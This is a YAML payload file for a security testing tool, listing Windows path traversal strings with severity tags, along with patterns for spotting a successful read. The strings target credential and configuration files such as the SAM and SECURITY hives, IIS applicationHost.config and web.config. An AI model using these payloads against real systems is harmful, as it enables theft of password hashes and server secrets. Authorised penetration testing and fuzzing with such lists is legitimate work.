metadata:
  type: traversal/windows
  version: "1.0"
  description: "Windows path traversal payloads"
  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]

detection_patterns:
  - "\\[boot loader\\]"
  - "\\[operating systems\\]"
  - "Volume Serial Number"

payloads:
  basic:
    - value: "..\\..\\..\\windows\\system32\\config\\sam"
      description: "Basic Windows SAM traversal"
      severity: critical
      tags: [basic, sam]

    - value: "..\\..\\..\\windows\\system32\\config\\system"
      description: "Windows system config"
      severity: critical
      tags: [basic, system]

    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
      description: "Windows hosts file"
      severity: high
      tags: [basic, hosts]

    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hostname"
      description: "Windows hostname"
      severity: high
      tags: [basic, hostname]

    - value: "..\\..\\..\\windows\\win.ini"
      description: "Windows win.ini"
      severity: high
      tags: [basic, win_ini]

    - value: "..\\..\\..\\windows\\boot.ini"
      description: "Windows boot.ini"
      severity: high
      tags: [basic, boot_ini]

    - value: "..\\..\\..\\boot.ini"
      description: "Boot.ini root"
      severity: high
      tags: [basic, boot_ini]

    - value: "..\\..\\..\\windows\\system32\\config\\sam"
      description: "SAM file"
      severity: critical
      tags: [basic, sam]

    - value: "..\\..\\..\\windows\\repair\\sam"
      description: "Backup SAM"
      severity: critical
      tags: [basic, sam]

    - value: "..\\..\\..\\windows\\system32\\config\\system"
      description: "System config"
      severity: critical
      tags: [basic, system]

    - value: "..\\..\\..\\windows\\system32\\config\\security"
      description: "Security config"
      severity: critical
      tags: [basic, security]

    - value: "..\\..\\..\\windows\\system32\\config\\software"
      description: "Software config"
      severity: critical
      tags: [basic, software]

    - value: "..\\..\\..\\windows\\system32\\config\\default"
      description: "Default config"
      severity: high
      tags: [basic, default]

    - value: "..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config"
      description: "IIS config"
      severity: critical
      tags: [basic, iis]

    - value: "..\\..\\..\\inetpub\\wwwroot\\web.config"
      description: "IIS web.config"
      severity: critical
      tags: [basic, iis]

    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\networks"
      description: "Networks file"
      severity: medium
